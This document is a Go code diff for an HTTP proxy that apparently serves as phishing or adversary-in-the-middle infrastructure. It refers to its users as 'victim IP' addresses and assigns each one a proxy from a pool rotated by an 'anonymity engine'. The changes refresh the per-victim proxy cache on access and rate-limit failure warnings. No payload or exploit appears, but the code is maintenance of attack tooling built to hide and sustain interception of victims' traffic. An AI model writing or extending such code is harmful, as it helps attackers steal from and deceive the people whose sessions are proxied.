@@ -4301,14 +4301,15 @@ func (p *HttpProxy) startSessionJanitor() {
 // assignProxyToIP assigns a proxy from the pool to a victim IP address
 // This ensures all requests from the same IP use the same proxy
 func (p *HttpProxy) assignProxyToIP(victimIP string) *ProxyInfo {
-	// Check if IP already has an assigned proxy
+	// Check if IP already has an assigned proxy in our local cache
 	if existing, ok := p.ipProxyMap.Load(victimIP); ok {
 		if proxyInfo, ok := existing.(*ProxyInfo); ok {
 			// Check if mapping hasn't expired
 			if expiry, ok := p.ipProxyExpiry.Load(victimIP); ok {
 				if expiryTime, ok := expiry.(time.Time); ok {
 					if time.Now().Before(expiryTime) {
-						log.Debug("[IPProxy] Reusing existing proxy for IP %s: %s:%d", victimIP, proxyInfo.Host, proxyInfo.Port)
+						// Refresh expiry on access
+						p.ipProxyExpiry.Store(victimIP, time.Now().Add(30*time.Minute))
 						return proxyInfo
 					}
 				}
@@ -4321,9 +4322,13 @@ func (p *HttpProxy) assignProxyToIP(victimIP string) *ProxyInfo {
 		return nil
 	}
 
+	// GetAvailableProxy now checks if session already has a proxy assigned
 	proxyInfo, err := p.anonymityEngine.proxyRotator.GetAvailableProxy(victimIP)
 	if err != nil || proxyInfo == nil {
-		log.Warning("[IPProxy] Failed to get proxy for IP %s: %v", victimIP, err)
+		// Rate-limit the warning - only log once per IP per minute
+		if p.shouldLogProxyWarning(victimIP) {
+			log.Warning("[IPProxy] Failed to get proxy for IP %s: %v", victimIP, err)
+		}
 		return nil
 	}
 
@@ -4333,6 +4338,20 @@ func (p *HttpProxy) assignProxyToIP(victimIP string) *ProxyInfo {
 
 	log.Info("[IPProxy] Assigned proxy %s:%d to victim IP %s", proxyInfo.Host, proxyInfo.Port, victimIP)
 	return proxyInfo
+}
+
+// shouldLogProxyWarning rate-limits proxy warning logs to once per IP per minute
+func (p *HttpProxy) shouldLogProxyWarning(victimIP string) bool {
+	key := "proxy_warn_" + victimIP
+	if lastWarn, ok := p.ipProxyExpiry.Load(key); ok {
+		if lastTime, ok := lastWarn.(time.Time); ok {
+			if time.Since(lastTime) < time.Minute {
+				return false // Don't log, too recent
+			}
+		}
+	}
+	p.ipProxyExpiry.Store(key, time.Now())
+	return true
 }
 
 // getProxyForIP retrieves the assigned proxy for a victim IP
